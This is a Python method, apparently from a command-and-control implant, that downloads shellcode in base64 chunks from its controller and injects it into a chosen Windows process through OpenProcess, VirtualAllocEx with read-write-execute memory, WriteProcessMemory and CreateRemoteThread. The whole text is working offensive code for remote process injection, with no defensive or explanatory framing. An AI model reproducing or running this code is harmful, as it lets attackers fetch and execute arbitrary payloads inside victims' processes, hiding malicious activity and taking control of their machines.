    def shinject(self, task_id, shellcode, pid):
        from ctypes import windll,c_int,byref,c_ulong
        total_chunks = 1
        chunk_num = 0
        sc = b""
        while (chunk_num < total_chunks):
            data = { 
                "action": "post_response", "responses": [{
                    "upload": { "chunk_size": 51200, "file_id": shellcode, "chunk_num": chunk_num },
                    "task_id": task_id
                }] 
            }
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            sc+=base64.b64decode(chunk["chunk_data"])

        PAGE_EXECUTE_READWRITE = 0x00000040
        PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
        VIRTUAL_MEM  = ( 0x1000 | 0x2000 )

        kernel32 = windll.kernel32
        code_size = len(sc)
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

        if not h_process:
            return "Error: Couldn't acquire a handle to PID {}".format(pid)
        arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
        written = c_int(0)
        kernel32.WriteProcessMemory(h_process, arg_address, sc, code_size, byref(written))
        thread_id = c_ulong(0)
        if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
            return "[*] Failed to inject process-killing shellcode. Exiting."
        return "[*] Remote thread created."
